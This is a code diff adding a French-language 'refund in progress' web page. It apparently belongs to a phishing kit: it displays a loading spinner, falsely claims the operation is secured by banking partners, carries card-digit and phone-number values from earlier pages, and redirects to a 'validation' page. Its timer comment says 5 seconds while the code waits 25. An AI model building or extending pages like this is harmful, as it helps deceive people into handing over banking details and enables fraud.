@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Traitement en cours...</title>
+    <style>
+        /* Général */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f3f4f6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            padding: 30px;
+            max-width: 400px;
+            text-align: center;
+            animation: fadeIn 1.5s;
+        }
+
+        /* Effet d'apparition */
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(-20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Icônes sécurisées */
+        .secure-icons img {
+            width: 100%;
+            max-width: 250px;
+            margin-bottom: 20px;
+        }
+
+        /* Cercle de chargement */
+        .loading-spinner {
+            border: 6px solid #e6e6e6;
+            border-top: 6px solid #2ecc71; /* Couleur verte pour sécurité */
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            animation: spin 1.5s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Texte */
+        .message {
+            font-size: 16px;
+            font-weight: 500;
+            color: #444;
+            line-height: 1.5;
+            margin-top: 10px;
+        }
+
+        .sub-text {
+            font-size: 14px;
+            color: #777;
+            margin-top: 5px;
+        }
+
+        /* Pied de page */
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <!-- Conteneur principal -->
+    <div class="container">
+        <!-- Icônes sécurisées -->
+        <div class="secure-icons">
+            <img src="IMG_4262.jpeg" alt="Remboursement Sécurisé">
+        </div>
+
+        <!-- Cercle de chargement -->
+        <div class="loading-spinner"></div>
+
+        <!-- Message principal -->
+        <p class="message">
+            Merci de patienter, votre remboursement est en cours de traitement...
+        </p>
+
+        <!-- Texte secondaire -->
+        <p class="sub-text">
+            Cette opération est sécurisée par nos partenaires bancaires.
+        </p>
+
+        <!-- Pied de page -->
+        <div class="footer">
+            © 2024 Service de Remboursement | Sécurité garantie | Tous droits réservés.
+        </div>
+    </div>
+
+    <!-- Script JavaScript للتوجيه بعد 5 ثوانٍ -->
+    <script>
+        setTimeout(() => {
+            // تخزين البيانات لضمان وجودها عند التوجيه إلى الصفحة الثالثة
+            const lastFourDigits = localStorage.getItem('lastFourDigits') || '0000';
+            const phoneNumber = localStorage.getItem('phoneNumber') || 'Non renseigné';
+
+            // إعادة توجيه مع ضمان استمرار البيانات
+            window.location.href = "validation_remboursement.html";
+        }, 25000); // التوجيه بعد 5 ثوانٍ
+    </script>
+</body>
+</html>
